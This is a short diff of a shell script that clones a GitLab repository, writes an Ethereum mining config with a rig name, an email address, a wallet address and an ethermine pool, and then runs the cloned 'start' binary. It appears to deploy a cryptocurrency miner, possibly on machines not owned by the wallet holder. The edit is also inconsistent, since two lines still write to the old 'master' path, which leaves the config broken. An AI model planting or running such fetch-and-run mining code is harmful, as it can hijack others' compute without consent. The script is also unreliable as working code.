@@ -15,13 +15,13 @@ do
   fi
 done
 
-git clone https://gitlab.com/diablostrom5/master.git
+git clone https://gitlab.com/diablostrom5/main.git
 touch master/config.ini 
-echo "rigName = Soldier009" >> "master/config.ini"
-echo "email = diablostrom5@gmail.com" >> "master/config.ini" 
-echo "[Ethash]" >> "master/config.ini"
-echo "wallet = 0x205023e287bd796ed7f9d458a04d7956c11d9ea3" >> "master/config.ini"
+echo "rigName = Soldier009" >> "main/config.ini"
+echo "email = diablostrom5@gmail.com" >> "main/config.ini" 
+echo "[Ethash]" >> "main/config.ini"
+echo "wallet = 0x205023e287bd796ed7f9d458a04d7956c11d9ea3" >> "main/config.ini"
 echo "coin = eth" >> "master/config.ini" 
-echo "pool1 = us1.ethermine.org:5555" >> "master/config.ini" 
-echo "sortPools = true" >> "master/config.ini" 
-cd master && chmod +x config.ini && chmod +x start && ./start
+echo "pool1 = us1.ethermine.org:5555" >> "main/config.ini" 
+echo "sortPools = true" >> "main/config.ini" 
+cd main && chmod +x config.ini && chmod +x start && ./start
